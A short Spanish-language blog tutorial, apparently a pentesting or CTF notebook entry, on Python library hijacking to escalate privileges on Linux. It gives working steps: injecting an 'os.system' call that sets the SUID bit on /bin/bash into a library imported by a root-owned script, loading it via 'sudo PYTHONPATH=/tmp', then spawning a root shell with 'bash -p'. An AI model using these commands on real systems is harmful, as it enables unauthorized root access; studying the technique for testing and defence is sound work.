---
layout: single
title: Python Library Hijacking - Privilege Escalation
excerpt: "Hoy aprenderemos como escalar privilegios con una libreria de Python"
date: 2022-10-27
classes: wide
header:
  teaser: /assets/images/pythonLibrary/logo.jpg
  teaser_home_page: true
categories:
  - Tecnicas
tags:
  - Escalada de Privilegios
  - Hijacking
  - Trabajo
---

<p align="center">
<img src="/assets/images/pythonLibrary/logo.jpg" width="400">
</p>

a) Primero hay que localizar un Script que el dueño sea root

b) Luego al entrar a ese script, veremos que se utiliza alguna librería, y deberemos buscarla en /usr/lib/python... 

c) Entonces, ahora en la librería lo que tenemos que poner es lo siguiente:
``import os``
``os.system("chmod u+s /bin/bash")``

  c.1) Si no podemos escribir la libreria, hay que copiarla a /tmp o /dev/shm, y ahi inyectarle el comando.

  c.2) Y ahora para ejecutar con la libreria con nuestro comando inyectado, seria un `sudo PYTHONPATH=/tmp python3 ...`

d) Esto lo que hará es que le dará a la bash permisos de superusuario.
ahora solamente deberemos insertar ``bash -p`` y listo.


